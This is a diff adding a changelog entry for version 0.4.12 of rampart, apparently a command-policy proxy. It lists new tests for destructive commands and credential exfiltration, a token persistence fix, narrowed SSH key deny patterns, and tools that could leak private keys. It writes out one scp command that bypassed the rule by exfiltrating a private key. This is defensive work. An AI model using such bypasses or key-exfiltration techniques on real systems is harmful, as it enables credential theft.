@@ -7,6 +7,19 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+## [0.4.12] - 2026-02-24
+
+### Added
+
+- **E2E test suite** — 36 test cases covering destructive commands, credential access, exfil patterns, env injection, and false positive regression. Run with `rampart test tests/e2e.yaml`. The `--config` flag overrides the policy path in test YAML for dev workflows.
+
+### Fixed
+
+- **`rampart serve` generated a new random token on every restart** — the foreground serve path (including `--background`) only checked the `RAMPART_TOKEN` environment variable for the token; it never read `~/.rampart/token` and never wrote to it. Only the systemd/launchd install path called `resolveServiceToken`. Every restart broke existing tools and configs using the previous token. Now reads the persisted token before starting the proxy and writes it back after binding, consistent with the install path.
+- **SSH key policy false positives** — `cat ~/.ssh/id_rsa.pub` was incorrectly denied because the pattern `cat **/.ssh/**` was too broad. Narrowed to `cat **/.ssh/id_*` with explicit `.pub` exclusions for each read command.
+- **SSH key exfil gaps** — added missing tools: `mv`, `xxd`, `hexdump`, `od`, `strings`, `sftp`. These could previously read/transfer private keys undetected.
+- **Dual-key scp bypass** — removed `-i` flag exclusion from scp/rsync rule. The exclusion allowed `scp -i auth_key exfil_key remote:` to bypass the rule (using one key for auth while exfiltrating another). Tradeoff: `scp -i key` for legitimate auth is now blocked; users can use ssh-agent or add a local policy override.
+
 ## [0.4.11] - 2026-02-24
 
 ### Fixed
